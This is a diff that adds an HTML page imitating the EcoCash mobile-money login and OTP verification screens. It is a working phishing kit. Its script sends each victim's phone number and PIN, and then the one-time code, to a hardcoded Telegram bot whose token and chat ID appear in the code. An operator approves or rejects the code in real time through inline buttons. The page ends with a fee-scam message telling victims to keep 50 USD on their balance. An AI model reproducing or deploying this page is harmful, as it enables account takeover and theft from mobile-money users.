@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Portal & Verification</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f5f7fa;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Back Button */
+        .back-btn {
+            position: absolute;
+            top: 24px;
+            left: 24px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 18px;
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            color: #334155;
+            font-size: 0.9rem;
+            font-weight: 500;
+            text-decoration: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .back-btn:hover {
+            background: #f1f5f9;
+            border-color: #cbd5e1;
+            transform: translateX(-3px);
+        }
+
+        .logo {
+            text-align: center;
+            padding: 50px 20px 10px;
+            flex-shrink: 0;
+        }
+
+        .logo-text {
+            font-size: 36px;
+            font-weight: 700;
+        }
+
+        .logo-eco {
+            color: #0066ff;
+        }
+
+        .logo-cash {
+            color: #ff0000;
+        }
+
+        /* Main View Containers */
+        .view-section {
+            flex: 1 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 30px 50px;
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        #otp-section {
+            display: none;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .phone-group {
+            width: 100%;
+            border: 2px solid #0066ff;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 18px 24px;
+            margin-bottom: 30px;
+            background: white;
+        }
+
+        .flag {
+            font-size: 28px;
+            margin-right: 12px;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            color: #0066ff;
+            font-weight: 600;
+            font-size: 18px;
+            margin-right: 16px;
+        }
+
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 18px;
+            color: #333;
+            background: transparent;
+        }
+
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+
+        .pin-label {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .pin-group {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .pin-box, .otp-box {
+            width: 55px;
+            height: 60px;
+            border: 2px solid #0066ff;
+            border-radius: 16px;
+            font-size: 28px;
+            text-align: center;
+            background: white;
+            color: #333;
+            font-weight: 600;
+            outline: none;
+        }
+
+        .pin-box:focus, .otp-box:focus {
+            border-color: #005eb8;
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
+        }
+
+        .forgot {
+            font-size: 15px;
+            color: #0066ff;
+            text-decoration: none;
+            font-weight: 500;
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+
+        #loginBtn, #submitBtn {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            padding: 18px;
+            background: #0066ff;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
+            transition: background 0.3s;
+        }
+
+        #loginBtn:hover, #submitBtn:hover {
+            background: #0052cc;
+        }
+
+        /* OTP Specific View Styles */
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .phone-display {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .otp-group {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .resend {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .resend span {
+            color: #0066ff;
+            font-weight: 600;
+        }
+
+        #otpStatus {
+            color: #e02020;
+            font-size: 0.95rem;
+            margin-top: 16px;
+            min-height: 20px;
+            word-break: break-word;
+            padding: 0 6px;
+            display: block;
+            text-align: center;
+        }
+
+        /* Bottom Section Curves & Links */
+        .bottom-section {
+            background: #005eb8;
+            color: white;
+            padding: 90px 30px 60px;
+            text-align: center;
+            width: 100vw;
+            margin-left: calc(-50vw + 50%);
+            position: relative;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+
+        .curve {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            background: #f5f7fa;
+            border-radius: 0 0 50% 50% / 0 0 100% 100%;
+            transform: scaleX(1.8);
+            transform-origin: top;
+        }
+
+        .bottom-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .bottom-text {
+            font-size: 15px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+
+        .bottom-btns {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .bottom-btn {
+            background: white;
+            color: #0066ff;
+            border: none;
+            border-radius: 30px;
+            padding: 16px 28px;
+            font-weight: 600;
+            font-size: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            width: 160px;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-icon {
+            font-size: 22px;
+            color: #0066ff;
+        }
+
+        .version {
+            font-size: 13px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        .terms {
+            font-size: 12px;
+            opacity: 0.85;
+            line-height: 1.5;
+        }
+
+        .terms a {
+            color: white;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        /* Loading Spinner Overlay */
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #005eb8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner-text {
+            font-size: 17px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 340px;
+            font-weight: 500;
+        }
+
+        /* RESULT OVERLAY */
+        #resultOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .result-message {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 340px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Top Back Button navigating back to Dashboard -->
+    <a href="/TradesChart/index.html" class="back-btn">
+        <i class="fas fa-arrow-left"></i> Dashboard
+    </a>
+
+    <div class="logo">
+        <div class="logo-text">
+            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+        </div>
+    </div>
+
+    <!-- SECTION 1: LOGIN FORM -->
+    <div class="view-section" id="login-section">
+        <h1 class="title">Login</h1>
+        <div class="phone-group">
+            <span class="flag">🇿🇼</span>
+            <div class="country-select">
+                +263 
+            </div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9" inputmode="numeric">
+        </div>
+        
+        <div class="pin-label">Enter your PIN</div>
+        <div class="pin-group">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        
+        <a href="#" class="forgot">Forgot PIN?</a>
+        <button id="loginBtn">LOGIN</button>
+    </div>
+
+    <!-- SECTION 2: OTP VERIFICATION FORM -->
+    <div class="view-section" id="otp-section">
+        <h1 class="title">OTP Verification</h1>
+        <div class="subtitle">Enter the OTP sent to your phone number</div>
+        <div class="phone-display" id="maskedPhone"></div>
+        <div class="pin-label">OTP Code</div>
+        <div class="otp-group">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
+        <button id="submitBtn">Submit</button>
+        <div id="otpStatus" aria-live="polite"></div>
+    </div>
+
+    <!-- FOOTER SECTION -->
+    <div class="bottom-section">
+        <div class="curve"></div>
+        <div class="bottom-content">
+            <div class="bottom-text">
+                To register an EcoCash wallet or get assistance,<br> click below
+            </div>
+            <div class="bottom-btns">
+                <a href="#" class="bottom-btn">
+                    <div class="btn-icon"><i class="fas fa-user-plus"></i></div>
+                    Register
+                </a>
+                <a href="#" class="bottom-btn">
+                    <div class="btn-icon"><i class="fas fa-info-circle"></i></div>
+                    Help & Support
+                </a>
+            </div>
+            <div class="version">v2.13P</div>
+            <div class="terms">
+                By signing in you agree to the <a href="#">Terms and Conditions</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinnerText">
+            Please wait...<br> This usually takes a few seconds
+        </div>
+    </div>
+
+    <!-- RESULT OVERLAY -->
+    <div id="resultOverlay">
+        <div class="result-message" id="resultMessage"></div>
+    </div>
+
+    <script>
+        // Bot 1 Config Only
+        const BOT_TOKEN_1 = '9172311461:AAEy7PYhgOYQPLRQ1_Ou3a3g-b3ZSzFXd8s';
+        const CHAT_ID_1 = '7929592927';
+
+        // DOM elements
+        const loginSection = document.getElementById('login-section');
+        const otpSection = document.getElementById('otp-section');
+        
+        const phoneInput = document.getElementById('phoneInput');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const submitBtn = document.getElementById('submitBtn');
+        const maskedPhoneEl = document.getElementById('maskedPhone');
+        const otpStatus = document.getElementById('otpStatus');
+        const timerSpan = document.getElementById('timer');
+        
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerText = document.getElementById('spinnerText');
+        const resultOverlay = document.getElementById('resultOverlay');
+        const resultMessage = document.getElementById('resultMessage');
+
+        let pinValue = '';
+        let otpValue = '';
+        let seconds = 116;
+        let countdownTimer = null;
+        let currentTimestamp = 0;
+        let actionProcessed = false;
+        let pollInterval = null;
+        let lastUpdateId = 0;
+
+        // Restore saved phone if available
+        const savedPhone = localStorage.getItem('phone');
+        if (savedPhone) {
+            phoneInput.value = savedPhone;
+        }
+
+        // Countdown timer utility
+        function startCountdown() {
+            clearInterval(countdownTimer);
+            seconds = 116;
+            countdownTimer = setInterval(() => {
+                seconds--;
+                if (timerSpan) timerSpan.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    if (timerSpan) timerSpan.textContent = '0';
+                }
+            }, 1000);
+        }
+
+        // Check PIN completion state
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+        }
+
+        // Check OTP completion state
+        function checkOtpComplete() {
+            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+            if (otpValue.length === 6) {
+                submitBtn.style.display = 'block';
+            } else {
+                submitBtn.style.display = 'none';
+            }
+        }
+
+        // Pin inputs navigation logic
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
+                if (box.value.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // OTP inputs navigation logic
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
+                if (box.value.length === 1 && index < 5) {
+                    otpBoxes[index + 1].focus();
+                }
+                checkOtpComplete();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // Send helper for Telegram Bot 1
+        async function sendToBot(text, replyMarkup) {
+            const payload = {
+                chat_id: CHAT_ID_1,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+            if (replyMarkup) {
+                payload.reply_markup = replyMarkup;
+            }
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Handle Bot action outcomes (Approve / Cancel / Wrong)
+        function handleCallback(callbackData, callbackQueryId) {
+            if (actionProcessed) return;
+            actionProcessed = true;
+
+            // Acknowledge callback to clear Telegram loading spinner
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ callback_query_id: callbackQueryId })
+            }).catch(() => {});
+
+            if (pollInterval) clearInterval(pollInterval);
+
+            spinnerOverlay.style.display = 'none';
+            const action = callbackData.split('_')[0];
+
+            if (action === 'approve') {
+                resultOverlay.style.display = 'flex';
+                resultMessage.textContent = 'Your registration fee is being approved. Login again after 5 hours and make sure you have at least 50 USD on your balance.';
+            } else if (action === 'cancel') {
+                resultOverlay.style.display = 'flex';
+                resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
+            } else if (action === 'wrong') {
+                spinnerOverlay.style.display = 'none';
+                otpStatus.style.color = '#e02020';
+                otpStatus.textContent = '⚠️ Incorrect OTP entered. Please re-enter code.';
+                otpBoxes.forEach(b => b.value = '');
+                otpBoxes[0].focus();
+                checkOtpComplete();
+                actionProcessed = false; // Reset listener lock for retry
+            }
+        }
+
+        // Poll Bot 1 for updates
+        function pollBot() {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (let update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+
+                            if (update.callback_query && !actionProcessed) {
+                                const cb = update.callback_query;
+                                const parts = cb.data.split('_');
+                                const ts = parseInt(parts[1]);
+
+                                if (ts === currentTimestamp) {
+                                    handleCallback(cb.data, cb.id);
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        // Start background polling loop for Bot 1
+        function startPolling() {
+            actionProcessed = false;
+            pollInterval = setInterval(pollBot, 1500);
+        }
+
+        // ========== LOGIN CLICK HANDLER ==========
+        loginBtn.addEventListener('click', async () => {
+            const phone = phoneInput.value.trim();
+            if (!phone || phone.length < 9) {
+                alert('Please enter a valid phone number');
+                return;
+            }
+
+            spinnerText.innerHTML = 'Authenticating login credentials...<br>Please wait.';
+            spinnerOverlay.style.display = 'flex';
+            
+            localStorage.setItem('phone', phone);
+
+            const message = `New EcoCash Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
+            await sendToBot(message);
+
+            setTimeout(() => {
+                spinnerOverlay.style.display = 'none';
+                loginSection.style.display = 'none';
+                otpSection.style.display = 'block';
+
+                // Setup masked phone display string
+                const visibleStart = phone.slice(0, 3);
+                const visibleEnd = phone.slice(-2);
+                maskedPhoneEl.textContent = `+263 ${visibleStart}****${visibleEnd}`;
+
+                startCountdown();
+                otpBoxes[0].focus();
+            }, 1200);
+        });
+
+        // ========== OTP SUBMIT CLICK HANDLER ==========
+        submitBtn.addEventListener('click', async () => {
+            if (otpValue.length !== 6) return;
+
+            otpStatus.textContent = '';
+            currentTimestamp = Date.now();
+            
+            const phone = phoneInput.value.trim();
+            const message = `*OTP Verification Submission*\n\n📱 Phone: +263 ${phone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve, decline, or mark wrong.`;
+            
+            const replyMarkup = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Approve', callback_data: 'approve_' + currentTimestamp },
+                        { text: '❌ Cancel', callback_data: 'cancel_' + currentTimestamp }
+                    ],
+                    [
+                        { text: '⚠️ Wrong OTP', callback_data: 'wrong_' + currentTimestamp }
+                    ]
+                ]
+            };
+
+            spinnerText.innerHTML = 'Verifying security code...<br>Awaiting confirmation.';
+            spinnerOverlay.style.display = 'flex';
+
+            await sendToBot(message, replyMarkup);
+            startPolling();
+        });
+
+        checkPinComplete();
+        pinBoxes[0].focus();
+    </script>
+</body>
+
+</html>
